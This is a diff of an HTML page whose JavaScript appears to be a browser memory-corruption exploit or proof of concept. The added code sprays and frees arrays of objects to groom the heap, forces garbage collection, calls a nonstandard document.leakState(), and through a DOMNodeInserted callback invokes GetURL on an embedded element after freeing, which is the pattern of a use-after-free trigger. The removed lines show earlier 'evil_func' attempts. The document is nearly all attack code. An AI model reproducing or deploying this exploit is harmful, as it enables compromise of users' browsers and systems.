@@ -1,18 +1,35 @@
+<head>
+<script>
+
+function gc() {
+    for (let i = 0; i < 0x60; i++) { new ArrayBuffer(0x1000000); }
+}
+
+var placeholder_1 = [];
+var holes = [];
+var placeholder_2 = [];
+
+for (let i = 0; i < 7; ++i)
+    holes.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
+for (let i = 0; i < 239; ++i)
+    placeholder_1.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
+
+holes.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
+for (let i = 0; i < 250; ++i)
+    placeholder_2.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
+
+holes = undefined;
+
+gc();
+</script>
+</head>
 <body onload="start();">
 <embed id="worker" src="data:video/mp4;"></embed>
 <script>
-var analyserNode;
-var barrier;
-
-function MyObject() {
-    this.name = "Object";
-    this.scriptObject = {
-    	GetURL: "hahahaha",
-    }
-}
 
 function start()
 {
+    document.leakState();
     worker = document.getElementById("worker");
     window.top.document.getElementById("cur").addEventListener("DOMNodeInserted", callback0);
     var intl = setInterval(function(){
@@ -21,35 +38,19 @@ function start()
         clearInterval(intl);
     }, 1);
 }
+
 function callback0(ev) {
     window.requestAnimationFrame(callback);
 }
-function gc() {
-    for (let i = 0; i < 0x60; i++) { new ArrayBuffer(0x1000000); }
-}
-function callback(ev) {
-    for (let i=0; i<300; ++i)
-	window.top.arrayWorkers[i].postMessage("Stop");
-    gc();
-    setTimeout(function() { 
-	    analyserNode.evil_func(worker);
-	}, 1000);
-    /*
-    for (let i = 0; i < 230; ++i) { 
-	var tmp = {a: 1, b: 2, c: 3, d: 4};
-	analyserNode.angel_func(worker, tmp);
-    }
-    worker.fuck = "you";
-    */
-    alert("DONE");
-}
 
-try {
-    audioContext = new AudioContext();
-} catch(e) {
-    alert('Web Audio API is not supported in this browser');
+function callback(ev) {
+    placeholder_2 = undefined;
+    gc();
+    document.leakState();
+    setTimeout(function() {
+	worker.GetURL();
+    }, 1000);
 }
-analyserNode = audioContext.createAnalyser();
 
 </script>
 </body>
